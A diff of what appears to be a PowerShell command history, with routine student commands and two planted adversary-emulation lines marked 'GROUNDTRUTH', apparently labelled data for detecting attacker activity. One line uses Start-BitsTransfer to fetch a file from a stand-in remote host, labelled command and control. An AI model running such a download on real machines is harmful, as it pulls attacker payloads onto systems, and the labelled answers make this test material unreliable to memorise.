@@ -47,7 +47,7 @@ ls
 cd .\hw1_codes\
 ls
 python .\driver.py
-Start-BitsTransfer -Source "http://remote-host/TWUEGJDITXAONVPUOWFV" -Destination "c:\ProgramData\temp\TWUEGJDITXAONVPUOWFV" // menu_pass/Emulation_Plan/yaml/menupass.yaml#L10 # Scenario 1, Step 2 - Command and Control
+Start-BitsTransfer -Source "http://remote-host/TWUEGJDITXAONVPUOWFV" -Destination "c:\ProgramData\temp\TWUEGJDITXAONVPUOWFV" // GROUNDTRUTH: menu_pass/Emulation_Plan/yaml/menupass.yaml#L10 # Scenario 1, Step 2 - Command and Control
  & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '50123' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\driver.py' 
  c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI'; & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '50138' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\driver.py' 
  c:; cd 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI'; & 'C:\Users\jgwak\AppData\Local\Programs\Python\Python39\python.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1191016588\pythonFiles\lib\python\debugpy\launcher' '50146' '--' 'c:\Users\jgwak\OneDrive\Desktop\Intro_to_AI\driver.py' 
@@ -79,7 +79,7 @@ python3
  c:; cd 'c:\Users\jgwak\OneDrive\Desktop\cs240_TA_관련\feedback'; & 'C:\Users\jgwak\AppData\Local\Microsoft\WindowsApps\python3.9.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1230869389\pythonFiles\lib\python\debugpy\launcher' '51282' '--' 'c:\Users\jgwak\OneDrive\Desktop\cs240_TA_관련\feedback\feedbacker.py' 
  c:; cd 'c:\Users\jgwak\OneDrive\Desktop\cs240_TA_관련\feedback'; & 'C:\Users\jgwak\AppData\Local\Microsoft\WindowsApps\python3.9.exe' 'c:\Users\jgwak\.vscode\extensions\ms-python.python-2021.9.1230869389\pythonFiles\lib\python\debugpy\launcher' '59694' '--' 'c:\Users\jgwak\OneDrive\Desktop\cs240_TA_관련\feedback\feedbacker.py' 
 exit()
-Test-NetConnection "192.0.2.10" // https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4a57b3dd5d28ad1bd79e927e04b20fd4d66934a0/menu_pass/Emulation_Plan/yaml/menupass.yaml#L90 // # Scenario 1, Step 3: Discovery
+Test-NetConnection "192.0.2.10" // GROUNDTRUTH: https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4a57b3dd5d28ad1bd79e927e04b20fd4d66934a0/menu_pass/Emulation_Plan/yaml/menupass.yaml#L90 // # Scenario 1, Step 3: Discovery
 ls
 l
 s
